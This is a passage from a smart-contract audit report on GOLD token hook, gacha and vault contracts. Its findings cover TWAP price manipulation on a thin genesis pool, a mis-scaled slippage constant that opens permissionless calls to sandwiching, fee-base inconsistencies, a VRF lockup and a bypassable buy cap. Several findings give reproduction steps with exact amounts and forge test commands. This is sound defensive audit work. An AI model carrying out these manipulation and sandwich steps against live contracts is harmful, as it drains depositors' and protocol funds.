tokensForEth for the genesis token returns the larger of the two quotes (the lower price), so only the 30-minute window needs to move. GenesisVault.quote converts (1-d) * 0.01 ETH at that price (src/GenesisVault.sol:118) and BagGacha._commitGenesis values the result with valueAndCap at the same min(short, long) price (src/BagGacha.sol:559-565), so gValue always equals (1-d)P and the 0.05 ETH cap never clips a Genesis Bag whatever the manipulation. At the design minimum depth (1-2 ETH of ETH-side virtual reserve) one exact-input sell of 2.1 GOLD moves the tick by +13738 (price / 3.95); after 30 quiet minutes the short TWAP has fully moved, every spin's Genesis quote is 3.95x, and the attacker spins (draw, keep, claim) until the vault's 3-day-ahead ceiling binds. On a 1-2 ETH pool in its first days there may be no arbitrage to restore the price. Note the ETH-side depth bound points the right way for a sell (depth halves), so at exactly 1 ETH the attacker also needs the JIT liquidity of the previous finding, which costs nothing. Merged from audit_permissions and audit_math. Launch judge: raises it as the quantified manipulation cost at the chosen 1 ETH depth; a block depends on whether the requester accepts the thin-launch risk, so recorded as medium and not blocking on its own. Minimal fix: use Math.min of the two quotes in tokensForEth for the genesis token (both windows must then be moved, raising the holding cost 8x) and/or value the genesis cap at the 4-hour TWAP; or require a higher depth (e.g. 10 ETH) before the Genesis lane opens.

**Reproduction**

Real vendored PoolManager, genesis pool with L = 2.1e18 at 1:1 (2.1 ETH ETH-side depth), 5 hours of ring history and a dust buy. tokensForEth(GOLD, 0.0092 ether) = 9200000000000000 (honest). Attacker sells exact input 2.1 GOLD: receives 1032962986984442130 wei, tick becomes 13738. Warp 30 minutes with no other trade. tokensForEth(GOLD, 0.0092 ether) = 36340571838600083 (3.95x); valueAndCap(GOLD, 36340571838600083) = (9199999999999999, 52830201053752922): value < cap, nothing clipped. Buy back with 1.1 ETH exact input: 2105260495846862770 wei GOLD returned, round-trip ETH cost 67037013015557870 wei (0.067 ETH). Expected: a quote within the fee band of the 4-hour price, or a cap that clips it. Run: forge test --match-path test/scratch/Verify.t.sol --match-test testThinPoolTwapPush -vv (verification harness; passes while asserting the 3x inflation).

### 6. Medium: POLManager.MIN_OUT_BPS subtracts 1250 bps for the 1.25% LP fee (fee 12500 is in hundredths of a bip): the slippage floor is 83.5% of the TWAP quote instead of the documented 94.75%

`src/POLManager.sol:41`

```
    uint256 public constant MIN_OUT_BPS = 10_000 - 1250 - 100 - 300;
```

The v4 pool fee 12500 is expressed in hundredths of a basis point (1.25% = 125 bps). The constant treats it as 1250 bps (12.5%), so the comment above it ('after the 1.25% LP fee and 1% hook fee: 3% of price impact') and the README describe a 94.75% floor while the code enforces 83.5%. buyAndBurn and addLiquidity are permissionless and spend protocol ETH (burn budget from 4% of spins; POL budget from 50% of the mint escrow plus the POL share of spins), so a searcher can sandwich each call and move the price up to about 11.25 percentage points further than designed before it executes, pocketing the difference on every 1 ETH chunk until the budgets are spent. Launch judge: raises it as a math defect in the economics section; not a block by itself but it should be corrected before launch 2. Minimal fix: MIN_OUT_BPS = 10_000 - 125 - 100 - 300 (9475).

**Reproduction**

Input: deploy POLManager and read MIN_OUT_BPS(). Expected: 9475. Actual: 8350. Consequence for buyAndBurn(1 ether) with TWAP quote Q tokens: minOut = 0.835 * Q instead of 0.9475 * Q, so a swap returning 0.84 * Q passes although it is 10.75 points below the design bound. Run: forge test --match-path test/scratch/Verify.t.sol --match-test testMinOutBps (fails on this code: 8350 != 9475).

### 7. Low: Exact-output buys pay the 1% hook fee on the net pool input rather than on the gross ETH paid, so inside the tax window the holder fee is 0.1% of gross and 11% more GOLD is bought per gross ETH than w

`src/GoldHook.sol:230`

```
                fee = (ethIn * HOOK_FEE_BPS) / BPS;
```

For an exact-input buy _specifiedCharge takes fee = 1% and tax = taxBps of the gross amount paid. For an exact-output buy afterSwap takes fee = 1% of ethIn (the ETH the pool consumed) and tax = ethIn * t / (1 - t). The tax is consistent as a share of gross, the fee is not: gross = ethIn * (1 + 0.01 + t/(1-t)), so at t = 90% the fee is 0.0999% of gross instead of 1%. Two buyers paying the same gross ETH receive different amounts of GOLD and pay different holder fees depending on the swap mode. Outside the tax window the discrepancy is 0.99% vs 1% and immaterial. Launch judge: notes it, no block. Fix if parity is wanted: gross = ethIn * BPS / (BPS - HOOK_FEE_BPS - taxBps); fee = gross * HOOK_FEE_BPS / BPS; tax = gross - fee - ethIn.

**Reproduction**

Real vendored PoolManager, 100 ETH / 100 GOLD at 1:1, launch block (90% tax). Exact-output buy of 0.004 GOLD: swapper amount0 = -40548457381333241 (gross), holderAccrued = 20253974715950 (fee = 40507949431900 = 1% of the 4.05e15 wei the pool consumed = 9 bps of gross), reserveAccrued = 36477408463427157. An exact-input buy of the same gross would charge fee 405484573813332 (1%) and leave 3649361164319993 wei for the pool versus 4050794943190044 wei here. Run: forge test --match-path test/scratch/Verify.t.sol --match-test testExactOutputFeeBase -vv.

### 8. Low: An unfulfilled VRF request locks the gacha permanently, including every depositor's withdraw(): there is no timeout, cancel or reroll (documented liveness tradeoff, recorded as a trust assumption)

`src/BagGacha.sol:435`

```
        if (pending) revert DrawPending();
```

_request sets pending = true (line 531) and only rawFulfillRandomWords from the wrapper followed by draw() clears it (line 689). If the Chainlink wrapper never delivers (wrapper paused or deprecated, coordinator failure, dropped request), spin()/holderSpin()/freeSpin() revert DrawPending, draw() reverts NotFulfilled, and every depositor's withdraw() reverts DrawPending at this line indefinitely, so all sealed Bag tokens and the locked liability are frozen with no recovery path and no owner. The README records this as the accepted 'VRF liveness tradeoff'; it is listed so the judge sees the trust assumption stated explicitly, not as a permission bypass. Launch judge: records it, no block. If recovery without an owner is wanted: after a long timeout (e.g. 24 h) let anyone cancel the pending request, credit req.paid back to the spinner, release the liability and uncommit the genesis tokens.

**Reproduction**

State: any spin() succeeded, pending == true, the wrapper never calls rawFulfillRandomWords. Input: a depositor calls withdraw(bagId) after the 24 h maturation, or anyone calls spin()/draw(). Expected: some exit path. Actual (code trace src/BagGacha.sol:435, 508, 651): withdraw and spin revert DrawPending, draw reverts NoDrawPending/NotFulfilled, forever.

### 9. Low: withdraw() waives the 0.5% exit fee whenever the Bag is momentarily unpriceable, which for GOLD Bags only needs one hour without a swap on the v4 pool or the first 4 hours after launch

`src/BagGacha.sol:438`

```
        try this.bagValue(bagId) returns (uint256 v) {
```

TwapOracle reverts StalePool for GOLD when the hook's last observation is older than MAX_STALENESS (1 hour, src/TwapOracle.sol:205), and observations are written only by swaps; it also reverts OldObservation during the first 4 hours after pool initialization. The try/catch here turns any such revert into fee = 0, so a depositor of a GOLD (or any thin-pool token) Bag exits fee-free by waiting for a quiet hour or by withdrawing before the 4-hour history exists. The README documents the waiver for 'delisted, stale or thin' pools, so this is a design choice; it is listed because the condition is trivially reachable on the genesis pool and the fee is the reserve's only compensation for listing churn. Launch judge: notes it, no block.

**Reproduction**

State: a GOLD Bag sealed and matured (24 h), no swap on the GOLD pool for 3601 seconds. Input: depositor calls withdraw(bagId) with msg.value 0. Expected (if the fee were intended): revert WrongPayment. Actual (code trace src/BagGacha.sol:438-441 with src/TwapOracle.sol:205): this.bagValue reverts StalePool inside the try, fee = 0, msg.value 0 passes, the Bag is returned with no exit fee.

### 10. Info: The 0.5 ETH first-hour buy cap is enforced per swap call, not per buyer, so it is bypassed by repeating 0.5 ETH swaps in the same block

`src/GoldHook.sol:394`

```
        if (block.timestamp < launchedAt + EARLY_WINDOW && ethIn > MAX_EARLY_BUY) {
```

_checkBuyCap compares only the current swap's ETH amount with MAX_EARLY_BUY; there is no per-address, per-block or cumulative bound, and the hook only sees the router as sender. The README describes 'caps buys at 0.5 ETH in the first hour'; as implemented it caps the size of one swap, so a sniper only pays per-swap gas (and, in the first 30 minutes, the tax on every slice). Launch judge: records it as a design note, no block, unless the brief meant a per-wallet cap, in which case it would need tx.origin or router-supplied identity.

**Reproduction**

Real vendored PoolManager, launch block, 100 ETH / 100 GOLD. Two consecutive exact-input buys of 0.5 ETH from the same trader in the same block both succeed; hook claims after them = 910000000000000000 wei (fee + tax on 1 ETH gross); a single 0.6 ETH buy reverts BuyTooLarge. Run: forge test --match-path test/scratch/Verify.t.sol --match-test testBuyCapSplit -vv.

---

Judge's submission `d03f5b0c079124aa666ad4380174bdfbf1b8bfe75336b407a21de97dd043f72a`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
